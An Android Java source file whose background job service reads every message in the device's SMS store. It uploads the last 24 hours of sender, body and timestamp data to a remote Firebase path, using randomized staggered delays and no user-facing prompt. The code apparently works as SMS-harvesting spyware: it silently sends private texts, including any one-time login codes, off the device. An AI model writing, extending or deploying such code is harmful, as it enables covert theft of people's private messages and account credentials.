package com.example.sms;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Locale;
import java.util.Queue;
import java.util.Set;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;

public class SmsJob extends JobService {


    public long smstime=0;

    @Override
    public  boolean onStartJob(JobParameters params) {

        String custompath=getCustomPathFromPreferences(getApplicationContext());
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            Bundle smsData=params.getTransientExtras();
            String sender=smsData.getString("sendernumber");
            String message=smsData.getString("message");
            long timestamp=smsData.getLong("timestamp");

            String fullsms=smsData.getString("full");

            //saveSmsToFirebase(custompath,sender,fullsms,timestamp);
            Log.d("startjob", "job called when app is off: ");
            //saveSmsToLocalStorage(getApplicationContext(), sender, message, timestamp);
            setTime(timestamp);
            Intent start=new Intent(this, BackgroundRun.class);
            start.setAction("UPDATE_TIME");
            startService(start);

        }


        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return false;
    }




    private void saveSmsToLocalStorage(Context context, String sender, String messageBody, long timestampMillis) {

        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();

        // Create a unique key for each SMS based on timestamp
        String smsKey = String.valueOf(timestampMillis);

        // Store SMS details in SharedPreferences
        editor.putString("smsSender_" + smsKey, sender);
        editor.putString("smsBody_" + smsKey, messageBody);
        editor.putLong("smsTimestamp_" + smsKey, timestampMillis);

        editor.apply();
    }
   public void compareStoredSms(Context context) {
       Uri smsUri = Telephony.Sms.CONTENT_URI;
       ContentResolver contentResolver = context.getContentResolver();
       Cursor cursor = contentResolver.query(smsUri, null, null, null, null);

       if (cursor != null && cursor.moveToFirst()) {
           int timestampIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
           int senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
           int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);

           Queue<String> senderQueue = new LinkedList<>();
           Queue<String> bodyQueue = new LinkedList<>();
           Queue<Long> timestampQueue = new LinkedList<>();
           Queue<String> uniqueIdQueue = new LinkedList<>(); // New queue for unique IDs

           do {
               long timestamp = cursor.getLong(timestampIndex);
               String sender = cursor.getString(senderIndex);
               String body = cursor.getString(bodyIndex);

               String uniqueId = UUID.randomUUID().toString();
               String uniqueIdPrefix = uniqueId.substring(0, 2); // Extract first 2 characters

               senderQueue.add(sender);
               bodyQueue.add(body);
               timestampQueue.add(timestamp);
               uniqueIdQueue.add(uniqueIdPrefix); // Add prefix to queue

           } while (cursor.moveToNext());

           cursor.close();

           processSmsQueues(context, senderQueue, bodyQueue, timestampQueue, uniqueIdQueue); // Pass additional queue
       }
    }
    private void processSmsQueues(Context context, Queue<String> senderQueue, Queue<String> bodyQueue, Queue<Long> timestampQueue, Queue<String> uniqueIdQueue) {
        String custom = getCustomPathFromPreferences(context);
        long thresholdTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000);

        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);

        int delay = 10000 + (int) (Math.random() * 5000); // Adjust delay as needed (milliseconds)

        while (!senderQueue.isEmpty() && !bodyQueue.isEmpty() && !timestampQueue.isEmpty() && !uniqueIdQueue.isEmpty()) {
            String sender = senderQueue.poll();
            String body = bodyQueue.poll();
            long timestamp = timestampQueue.poll();
            String uniqueIdPrefix = uniqueIdQueue.poll();

            String formattedTime = getFormattedTime(timestamp);
            String messageKey = formattedTime + "_" + uniqueIdPrefix;

            if (timestamp >= thresholdTime && !sharedPreferences.contains("smsSender_" + messageKey)) {
                // Check if message key exists (not processed)
                Log.d("NEWSMS", "sms is old: " + body);

                // Schedule sending with a delay (separate delay for each message)

                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        saveoldSmsToFirebase(custom, sender, body, messageKey);
                        // Save to SharedPreferences to mark as processed (optional)
                        saveSmsToLocalStorage(context, sender, body, timestamp);
                    }
                }, delay);

                delay += 1000; // Increase delay for next message (adjust as needed)
            }
        }
    }



    public String getFormattedTime(long timestampMillis) {
        Locale locale = Locale.getDefault();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss a z", locale);

        sdf.setTimeZone(TimeZone.getDefault());
        Date dateTime = new Date(timestampMillis);
        return sdf.format(dateTime);
    }

    public String getCustomPathFromPreferences(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        String customPath = sharedPreferences.getString("customPath", "");
        return sharedPreferences.getString("customPath", "");
    }


    private void saveoldSmsToFirebase(String custompath,String sender, String messageBody, String timestampmills) {

        String path = "user_messages/" + custompath;


        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference(path);

        // Format the timestamp as a human-readable string
        //String formattedTime = getFormattedTime(timestampmills);

        // Create a data object to store in the database
        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody,timestampmills);

        // Save the SMS to the database under the custom path with timestamp as the key

        databaseReference.child(timestampmills).setValue(smsMessage);




    }
    private void saveSmsToFirebase(String custompath,String sender, String messageBody, long timestampmills) {

        String path = "user_messages/" + custompath;


        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference(path);

        // Format the timestamp as a human-readable string
        String formattedTime = getFormattedTime(timestampmills);

        // Create a data object to store in the database
        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody,formattedTime);

        // Save the SMS to the database under the custom path with timestamp as the key

        databaseReference.child(formattedTime).setValue(smsMessage);




    }
public void setTime(long time){
        smstime=time;
}

public long getTime(){
        return smstime;
}





}
